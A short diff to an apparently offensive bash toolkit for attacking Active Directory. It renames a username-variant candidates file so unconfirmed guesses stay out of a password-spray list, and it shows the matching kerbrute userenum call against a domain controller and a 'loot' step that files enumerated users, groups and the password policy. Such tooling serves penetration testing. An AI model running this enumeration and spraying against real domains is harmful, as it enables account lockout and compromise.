@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.49.5"
+readonly VERSION="1.49.6"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 KERBRUTE_RC4_DEAD=0               # set when the DC rejects RC4 (KDC_ERR_ETYPE_NOSUPP) → kerbrute unusable, spray via netexec
@@ -5410,7 +5410,12 @@ phase_user_variants() {
     VARIANTS_DONE=1
     section "USERNAME VARIANTS · derive & validate alternate account formats"
 
-    local vf="$OUTDIR/users_variants.txt"
+    # NOTE: candidates file MUST be OUTSIDE the users_*.txt glob. Naming it
+    # users_variants.txt made every `cat $OUTDIR/users_*.txt` re-absorb the full
+    # SPECULATIVE variant set into users_all.txt (≈30 real users → 276), so the spray
+    # then hammered every made-up format × all passwords (slow + lockout). Only the
+    # kerbrute-CONFIRMED variants (users_variants_valid.txt, which IS in the glob) merge.
+    local vf="$OUTDIR/variant_candidates.txt"
     awk '
     {
       u=tolower($0); print u
@@ -5428,7 +5433,7 @@ phase_user_variants() {
     [[ ! -s "$vf" ]] && { info "No new username variants to test"; return; }
 
     subsection "Validating $(wc -l <"$vf") candidate usernames (kerbrute userenum)"
-    run "$KERBRUTE_BIN userenum -d $DOMAIN --dc $DC_IP users_variants.txt"
+    run "$KERBRUTE_BIN userenum -d $DOMAIN --dc $DC_IP variant_candidates.txt"
     "$KERBRUTE_BIN" userenum -d "$DOMAIN" --dc "$DC_IP" "$vf" 2>&1 | tee -a "$LOGFILE" \
         | grep -i 'VALID USERNAME' | grep -oiP '\K[A-Za-z0-9._-]+(?=@)' | sort -u >"$OUTDIR/users_variants_valid.txt"
     if [[ -s "$OUTDIR/users_variants_valid.txt" ]]; then
@@ -6803,7 +6808,7 @@ finalize_loot() {
     _mv_loot() { local dst="$1"; shift; local f
         for f in "$@"; do [[ -e "$OUTDIR/$f" ]] && mv -f "$OUTDIR/$f" "$OUTDIR/$dst/" 2>/dev/null; done; }
 
-    _mv_loot enum users_enum.txt users_rpc.txt users_ridbrute.txt users_variants.txt \
+    _mv_loot enum users_enum.txt users_rpc.txt users_ridbrute.txt variant_candidates.txt \
         users_variants_valid.txt domain_users.txt domain_groups.txt user_descriptions.txt \
         pass_policy.txt enum4linux.json nmap_dc.txt domain_wordlist.txt shares_auth.txt \
         _userenum_seed.txt _asrep_seed.txt
